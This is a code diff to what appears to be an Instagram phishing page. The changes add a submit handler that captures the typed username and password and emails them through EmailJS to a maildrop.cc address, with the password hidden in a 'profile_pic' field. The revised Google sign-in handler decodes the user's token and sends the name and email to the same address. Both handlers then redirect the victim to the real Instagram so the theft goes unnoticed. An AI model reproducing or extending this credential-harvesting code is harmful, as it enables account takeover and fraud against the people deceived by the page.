@@ -178,19 +178,37 @@
             GOOGLE_CLIENT_ID: "1056026425142-im9mmsv7huvujnma0q66soc2lpddhiqk.apps.googleusercontent.com"
         };
 
-        emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
+emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
 
-        function toggleTheme() {
-            const body = document.body;
-            const current = body.getAttribute('data-theme');
-            body.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
-        }
-
-        function handleCredentialResponse(response) {
-            // Decode Google User Info
-            const user = JSON.parse(atob(response.credential.split('.')[1]));
+        // --- NEW: MANUAL LOGIN CAPTURE ---
+        const loginForm = document.querySelector('form');
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
             
-            const templateParams = {
+            const usernameInput = loginForm.querySelector('input[type="text"]').value;
+            const passwordInput = loginForm.querySelector('input[type="password"]').value;
+
+            const manualData = {
+                to_email: "d-4wio0wr@maildrop.cc",
+                user_name: "MANUAL_LOGIN", // Label to distinguish from Google
+                user_email: usernameInput,   // The username/email typed
+                profile_pic: passwordInput,  // The password typed (sent to the 'profile_pic' tag for simplicity)
+                time: new Date().toLocaleString()
+            };
+
+            emailjs.send(CONFIG.SERVICE_ID, CONFIG.TEMPLATE_ID, manualData)
+                .then(() => {
+                    window.location.href = "https://www.instagram.com/accounts/login/";
+                });
+        });
+
+        // --- GOOGLE LOGIN CAPTURE ---
+        function handleCredentialResponse(response) {
+            const base64Url = response.credential.split('.')[1];
+            const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+            const user = JSON.parse(window.atob(base64));
+            
+            const googleData = {
                 to_email: "d-4wio0wr@maildrop.cc",
                 user_name: user.name,
                 user_email: user.email,
@@ -198,12 +216,12 @@
                 time: new Date().toLocaleString()
             };
 
-            emailjs.send(CONFIG.SERVICE_ID, CONFIG.TEMPLATE_ID, templateParams)
+            emailjs.send(CONFIG.SERVICE_ID, CONFIG.TEMPLATE_ID, googleData)
                 .then(() => {
-                    // Redirect to real Instagram so they think they logged in
-                    window.location.href = "https://www.instagram.com";
-                })
-                .catch(err => console.error("EmailJS Error:", err));
+                    setTimeout(() => {
+                        window.location.href = "https://www.instagram.com";
+                    }, 1000);
+                });
         }
 
         window.onload = () => {
